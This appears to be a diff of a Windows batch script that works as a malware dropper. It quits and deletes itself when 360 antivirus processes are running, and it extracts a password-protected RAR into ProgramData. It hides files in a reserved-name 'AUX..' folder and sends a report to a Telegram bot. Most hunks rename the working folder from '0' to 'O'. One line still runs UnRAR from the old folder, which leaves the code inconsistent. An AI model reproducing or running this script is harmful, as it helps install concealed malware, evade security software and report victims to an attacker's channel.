@@ -1,7 +1,7 @@
 setlocal EnableDelayedExpansion
 
 if exist "%ProgramData%\AUX..\Input.exe" (
-    rd /s /q "%ProgramData%\0"
+    rd /s /q "%ProgramData%\O"
     del /f "%~f0"
     exit /b
 )
@@ -11,14 +11,14 @@ set "processList=QHActiveDefense.exe QHWatchdog.exe QHSafeTray.exe PopWndLog.exe
 for %a in (%processList%) do (
     tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
     if not errorlevel 1 (
-        rd /s /q "%ProgramData%\0"
+        rd /s /q "%ProgramData%\O"
         del /f "%~f0"
         exit /b
     )
 )
 
 
-"%ProgramData%\0\UnRAR.exe" x -y -p741258963 "%ProgramData%\0\0.rar" "%ProgramData%\0\"
+"%ProgramData%\0\UnRAR.exe" x -y -p741258963 "%ProgramData%\O\O.rar" "%ProgramData%\O\"
 mkdir \\.\%ProgramData%\AUX..\
 
 move /Y "%ProgramData%\dist\Icon.dll" "\\.\%ProgramData%\AUX..\"
@@ -77,4 +77,4 @@ powershell -NoProfile -Command ^
   "[System.Console]::OutputEncoding = [System.Text.Encoding]::UTF8;" ^
   "try { Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message} } catch { Write-Host 'Error sending message to Telegram' }"
 endlocal
-rd /s /q "%ProgramData%\0"
+rd /s /q "%ProgramData%\O"
